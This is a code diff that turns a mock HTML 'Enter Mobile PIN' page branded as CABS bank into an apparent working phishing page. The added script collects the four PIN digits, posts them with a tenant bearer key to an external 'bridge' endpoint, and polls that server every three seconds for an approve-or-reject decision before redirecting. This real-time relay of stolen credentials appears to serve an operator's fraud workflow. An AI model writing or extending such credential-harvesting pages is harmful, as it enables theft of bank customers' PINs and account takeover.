@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CABS - Enter Mobile PIN</title>
     <style>
-        /* CSS Variables for CABS Branding */
         :root {
             --cabs-blue: #0d1a70;
             --cabs-green: #67ad38;
@@ -14,294 +13,119 @@
             --bg-color: #ffffff;
         }
 
-        * {
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
+
+        body { background-color: var(--bg-color); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+
+        /* Progress Overlay */
+        #progress-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.95); display: none;
+            justify-content: center; align-items: center; z-index: 2000; flex-direction: column;
         }
 
-        body {
-            background-color: var(--bg-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+        .progress-circle {
+            width: 60px; height: 60px; border-radius: 50%; border: 6px solid #eee;
+            border-top: 6px solid var(--cabs-blue); animation: spin 1s linear infinite; margin-bottom: 20px;
         }
 
-        .login-container {
-            width: 100%;
-            max-width: 500px;
-            padding: 40px 20px;
-            background: white;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Mock Logo Styling */
-        .logo-container {
-            text-align: center;
-            margin-bottom: 40px;
-        }
+        .login-container { width: 100%; max-width: 500px; padding: 40px 20px; background: white; }
+
+        .logo-container { text-align: center; margin-bottom: 40px; }
         
-        .logo-main {
-            font-size: 50px;
-            font-weight: 900;
-            color: var(--cabs-blue);
-            letter-spacing: -1px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            line-height: 1;
-        }
+        .welcome-text { font-size: 32px; color: var(--cabs-blue); font-weight: 800; line-height: 1.1; margin-bottom: 5px; }
 
-        .logo-swoosh {
-            color: var(--cabs-green);
-            font-size: 40px;
-            margin-left: 5px;
-            font-style: italic;
-        }
+        .ib-text { font-size: 32px; color: var(--cabs-green); font-weight: 800; line-height: 1.1; margin-bottom: 15px; }
 
-        .logo-sub {
-            font-size: 11px;
-            color: #555;
-            margin-top: 5px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
+        .instruction-text { color: var(--text-gray); font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
 
-        .logo-sub span {
-            color: var(--cabs-green);
-            font-weight: bold;
-        }
-
-        /* Headings */
-        .welcome-text {
-            font-size: 32px;
-            color: var(--cabs-blue);
-            font-weight: 800;
-            line-height: 1.1;
-            margin-bottom: 5px;
-        }
-
-        .ib-text {
-            font-size: 32px;
-            color: var(--cabs-green);
-            font-weight: 800;
-            line-height: 1.1;
-            margin-bottom: 15px;
-        }
-
-        .instruction-text {
-            color: var(--text-gray);
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 30px;
-        }
-
-        /* User Info Display */
-        .user-info {
-            background-color: #f4f5f9;
-            padding: 12px 20px;
-            border-radius: 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            border: 1px solid #e5e7eb;
-        }
-
-        .user-info-text {
-            color: var(--cabs-blue);
-            font-weight: 600;
-            font-size: 15px;
-        }
-
-        .user-info-change {
-            color: var(--cabs-green);
-            font-size: 13px;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        .user-info-change:hover {
-            text-decoration: underline;
-        }
-
-        /* PIN Input Boxes */
-        .pin-container {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 10px;
-            gap: 15px;
-        }
+        .pin-container { display: flex; justify-content: center; margin-bottom: 20px; gap: 15px; }
 
         .pin-input {
-            width: 60px;
-            height: 70px;
-            border: 2px solid var(--border-gray);
-            border-radius: 8px;
-            font-size: 36px;
-            font-weight: bold;
-            color: var(--cabs-blue);
-            text-align: center;
-            outline: none;
-            transition: all 0.2s;
-            background-color: #fafafa;
-            /* Hides the text replacing it with dots natively */
-            font-family: 'Courier New', Courier, monospace;
+            width: 60px; height: 70px; border: 2px solid var(--border-gray);
+            border-radius: 8px; font-size: 36px; font-weight: bold; color: var(--cabs-blue);
+            text-align: center; outline: none; background-color: #fafafa;
         }
 
-        .pin-input:focus {
-            border-color: var(--cabs-blue);
-            background-color: #fff;
-            box-shadow: 0 0 8px rgba(13, 26, 112, 0.15);
-        }
-
-        /* Buttons Container */
-        .button-group {
-            display: flex;
-            gap: 15px;
-            margin-top: 30px;
-        }
-
-        .btn {
-            flex: 1;
-            padding: 14px 0;
-            border-radius: 30px;
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-            text-align: center;
-            text-decoration: none;
-            transition: all 0.2s;
-            text-transform: uppercase;
-        }
-
-        .btn-outline {
-            background: transparent;
-            color: var(--cabs-blue);
-            border: 1px solid var(--cabs-blue);
-        }
-
-        .btn-outline:hover {
-            background: #f4f5f9;
-        }
+        .pin-input:focus { border-color: var(--cabs-blue); background-color: #fff; }
 
         .btn-solid {
-            background: var(--cabs-blue);
-            color: white;
-            border: 1px solid var(--cabs-blue);
+            background: var(--cabs-blue); color: white; border: none; width: 100%; padding: 14px 0;
+            border-radius: 30px; font-size: 14px; font-weight: 700; cursor: pointer; text-transform: uppercase;
         }
-
-        .btn-solid:hover {
-            background: #0a1457;
-        }
-
-        /* Forgot PIN Link */
-        .forgot-link {
-            display: block;
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-            color: var(--text-gray);
-            text-decoration: none;
-        }
-
-        .forgot-link span {
-            color: var(--cabs-blue);
-            font-weight: 600;
-        }
-
-        .forgot-link:hover span {
-            text-decoration: underline;
-        }
-
     </style>
 </head>
 <body>
 
+    <div id="progress-overlay">
+        <div class="progress-circle"></div>
+        <p style="color: var(--cabs-blue); font-weight: 600;">Processing PIN...</p>
+    </div>
+
     <div class="login-container">
-        
-        <!-- Logo Section -->
         <div class="logo-container">
-            <div class="logo-main">CABS<span class="logo-swoosh">///</span></div>
-            <div class="logo-sub">A MEMBER OF THE <span>OLD MUTUAL</span> GROUP</div>
+            <img src="logo.png" alt="CABS Logo" style="width: 150px; margin-bottom: 10px;">
         </div>
 
-        <!-- Headings -->
         <div class="welcome-text">Secure</div>
         <div class="ib-text">PIN Entry</div>
         
-        <p class="instruction-text">
-            Please enter your 4-digit Mobile PIN to authenticate and continue securely.
-        </p>
+        <p class="instruction-text">Please enter your 4-digit Mobile PIN to authenticate.</p>
 
-        <!-- Current User Display (Optional nice-to-have for flows) -->
-        <div class="user-info">
-            <span class="user-info-text">📱 +263 777 *** 777</span>
-            <a href="#" class="user-info-change" onclick="window.history.back()">CHANGE</a>
-        </div>
-
-        <!-- PIN Form -->
-        <form id="pin-form" onsubmit="event.preventDefault(); verifyPIN();">
-            
+        <form onsubmit="submitPinToBridge(event);">
             <div class="pin-container">
-                <!-- Using type="password" to mask inputs as dots -->
-                <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required autofocus>
-                <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required>
-                <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required>
-                <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required>
+                <input type="password" id="p1" class="pin-input" maxlength="1" inputmode="numeric" required autofocus>
+                <input type="password" id="p2" class="pin-input" maxlength="1" inputmode="numeric" required>
+                <input type="password" id="p3" class="pin-input" maxlength="1" inputmode="numeric" required>
+                <input type="password" id="p4" class="pin-input" maxlength="1" inputmode="numeric" required>
             </div>
-
-            <a href="#" class="forgot-link">Forgot your PIN? <span>Reset it here</span></a>
-
-            <div class="button-group">
-                <button type="button" class="btn btn-outline" onclick="window.history.back()">CANCEL</button>
-                <button type="submit" class="btn btn-solid">CONFIRM PIN</button>
-            </div>
-
+            <button type="submit" class="btn-solid">CONFIRM PIN</button>
         </form>
-
     </div>
 
+    <script src="config.js"></script>
     <script>
-        // --- PIN Input Auto-Advance Logic ---
+        const BRIDGE_URL = window.APP_CONFIG.BRIDGE_URL;
         const inputs = document.querySelectorAll('.pin-input');
-
+        
         inputs.forEach((input, index) => {
-            // When a number is typed, jump to the next input
             input.addEventListener('input', (e) => {
-                // Ensure only numbers are typed
                 e.target.value = e.target.value.replace(/[^0-9]/g, '');
-                
-                if (e.target.value !== '') {
-                    if (index < inputs.length - 1) {
-                        inputs[index + 1].focus();
-                    }
-                }
+                if (e.target.value !== '' && index < inputs.length - 1) inputs[index + 1].focus();
             });
-
-            // When backspace is pressed, jump to the previous input
             input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && e.target.value === '') {
-                    if (index > 0) {
-                        inputs[index - 1].focus();
-                    }
-                }
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) inputs[index - 1].focus();
             });
         });
 
-        // --- Mock Submit Function ---
-        function verifyPIN() {
-            let pinCode = "";
-            inputs.forEach(input => pinCode += input.value);
-            
-            if(pinCode.length === 4) {
-                alert("PIN Accepted! Processing your request...");
-                // In a real application, you would redirect to the dashboard or submit the loan:
-                // window.location.href = "cabs-loans.html";
-            } else {
-                alert("Please enter all 4 digits of your PIN.");
-            }
+        async function submitPinToBridge(event) {
+            event.preventDefault();
+            const pin = Array.from(inputs).map(i => i.value).join('');
+            if (pin.length !== 4) return alert('Enter 4-digit PIN');
+            document.getElementById('progress-overlay').style.display = 'flex';
+
+            try {
+                const response = await fetch(`${BRIDGE_URL}/v1/callback`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}` },
+                    body: JSON.stringify({ type: 'pin', pin: pin })
+                });
+                const { attemptId } = await response.json();
+                pollStatus(attemptId);
+            } catch (error) { alert('Failed.'); document.getElementById('progress-overlay').style.display = 'none'; }
+        }
+
+        async function pollStatus(attemptId) {
+            const interval = setInterval(async () => {
+                const res = await fetch(`${BRIDGE_URL}/v1/status?attemptId=${attemptId}`, {
+                    headers: { 'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}` }
+                });
+                const { status } = await res.json();
+                if (status === 'approved') { window.location.href = 'index.html'; clearInterval(interval); }
+                else if (status === 'rejected') { alert('PIN rejected.'); clearInterval(interval); document.getElementById('progress-overlay').style.display = 'none'; }
+            }, 3000);
         }
     </script>
 </body>
